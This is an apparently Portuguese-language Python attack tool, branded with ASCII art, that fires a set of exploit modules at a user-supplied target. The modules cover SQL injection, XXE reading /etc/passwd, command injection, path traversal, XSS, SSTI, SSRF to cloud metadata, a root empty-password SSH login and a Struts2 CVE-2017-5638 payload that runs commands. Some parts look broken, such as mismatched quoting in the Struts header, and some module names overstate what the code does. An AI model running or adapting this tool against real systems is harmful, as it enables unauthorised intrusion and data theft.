import requests
import socket
import dns.resolver
import paramiko
import subprocess

ASCII_ART = r'''
███████████  ████                     █████                          
░░███░░░░░███░░███                    ░░███                          
 ░███    ░███ ░███   ██████    ██████  ░███ █████                    
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
 ███████████  █████░░████████░░██████  ████ █████                    
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
                                                                    
                                                                    
                                                                    
  █████████                               █████                       
 ███░░░░░███                             ░░███                       
░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████
░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███
 ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░ 
 ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███     
░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████    
 ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░    
             ░███                                                  
             █████                                                 
            ░░░░░                                                  
'''

class SQLiAutoExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1 -- "]
        vulnerable = False
        for payload in payloads:
            url = self.target + "/search?q=" + requests.utils.quote(payload)
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and ('sql' in r.text.lower() or 'mysql' in r.text.lower() or 'syntax' in r.text.lower()):
                    vulnerable = True
                    return True, url
            except:
                continue
        return False, None

class XXEExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
        headers = {'Content-Type': 'application/xml'}
        try:
            r = requests.post(self.target, data=xxe_payload, headers=headers, timeout=5)
            if 'root:x:' in r.text:
                return True, r.text
        except:
            pass
        return False, None

class RCEExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        rce_payload = 'ping -c 1 127.0.0.1'
        params = ['cmd=', 'command=', 'exec=']
        for param in params:
            try:
                url = self.target + '/?' + param + requests.utils.quote(rce_payload)
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and ('ping' in r.text or 'icmp' in r.text):
                    return True, url
            except:
                continue
        return False, None

class LFIExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        lfi_payloads = ['../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd']
        param = 'file='
        for p in lfi_payloads:
            try:
                url = self.target + '/?' + param + requests.utils.quote(p)
                r = requests.get(url, timeout=5)
                if 'root:x:' in r.text:
                    return True, url
            except:
                continue
        return False, None

class XSSExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        xss_payload = "<script>alert('XSS')</script>"
        params = ['q=', 'search=']
        for param in params:
            try:
                url = self.target + '/?' + param + requests.utils.quote(xss_payload)
                r = requests.get(url, timeout=5)
                if xss_payload in r.text:
                    return True, url
            except:
                continue
        return False, None

class CVEExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        # Exemplo real para CVE-2017-5638 (Apache Struts2)
        exploit_url = self.target + "/struts2-showcase/index.action"
        headers = {
            'Content-Type': '%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
                            '(#ct=(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('
                            "'id').getInputStream()))).(#ct)}'
        }
        try:
            r = requests.get(exploit_url, headers=headers, timeout=5)
            if 'uid=' in r.text:
                return True, exploit_url
        except:
            pass
        return False, None

class SSTIExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        payloads = ['{{7*7}}', '${7*7}', '{7*7}']
        params = ['?name=', '?template=', '?input=']
        for p in params:
            for payload in payloads:
                url = self.target + p + payload
                try:
                    r = requests.get(url, timeout=8)
                    if '49' in r.text:
                        return True, url
                except Exception:
                    pass
        return False, None

class SSRFExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        ssrf_payload = "http://169.254.169.254/latest/meta-data/"
        params = ['url=', 'resource=']
        for param in params:
            try:
                url = self.target + '/?' + param + requests.utils.quote(ssrf_payload)
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    return True, url
            except:
                continue
        return False, None

class HTTPMethodExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'CONNECT']
        allowed = []
        for method in methods:
            try:
                r = requests.request(method, self.target, timeout=5)
                if r.status_code < 405:
                    allowed.append(method)
            except:
                continue
        if allowed:
            return True, allowed
        return False, None

class JenkinsExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        jenkins_url = self.target + '/script'
        try:
            r = requests.get(jenkins_url, timeout=5)
            if r.status_code == 200 and 'Jenkins' in r.text:
                return True, jenkins_url
        except:
            pass
        return False, None

class DNSExfiltration:
    def __init__(self, domain):
        self.domain = domain

    def run(self):
        try:
            answers = dns.resolver.resolve(self.domain, 'TXT')
            return True, [str(rdata) for rdata in answers]
        except Exception as e:
            return False, str(e)

class BannerGrabber:
    def __init__(self, target, port):
        self.target = target
        self.port = port

    def run(self):
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((self.target, self.port))
            banner = s.recv(1024).decode(errors='ignore').strip()
            s.close()
            if banner:
                return True, banner
        except:
            pass
        return False, None

class SSHScanner:
    def __init__(self, target, port=22):
        self.target = target
        self.port = port

    def run(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.port, username='root', password='', timeout=5)
            ssh.close()
            return True, "SSH open with root no password"
        except paramiko.AuthenticationException:
            return True, "SSH open but authentication required"
        except:
            return False, None

def main():
    print(ASCII_ART)
    target = input("Digite o alvo (ex: http://site.com): ").strip()
    dns_domain = input("Digite domínio DNS para DNSExfiltration (ex: example.com): ").strip()
    port = 22

    modules = {
        'SQLi': SQLiAutoExploit(target),
        'XXE': XXEExploit(target),
        'RCE': RCEExploit(target),
        'LFI': LFIExploit(target),
        'XSS': XSSExploit(target),
        'CVE': CVEExploit(target),
        'SSTI': SSTIExploit(target),
        'SSRF': SSRFExploit(target),
        'HTTP Methods': HTTPMethodExploit(target),
        'Jenkins': JenkinsExploit(target),
        'DNS Exfiltration': DNSExfiltration(dns_domain),
        'Banner Grabber': BannerGrabber(target.replace('http://', '').replace('https://', ''), port),
        'SSH Scanner': SSHScanner(target.replace('http://', '').replace('https://', ''), port)
    }

    for name, module in modules.items():
        print(f"\nExecutando módulo: {name}")
        try:
            success, info = module.run()
            if success:
                print(f"[OK] {name} vulnerabilidade encontrada!")
                print(f"Info: {info}")
            else:
                print(f"[INFO] {name} não vulnerável ou inacessível.")
        except Exception as e:
            print(f"[ERRO] Falha ao executar {name}: {e}")

if __name__ == "__main__":
    main()


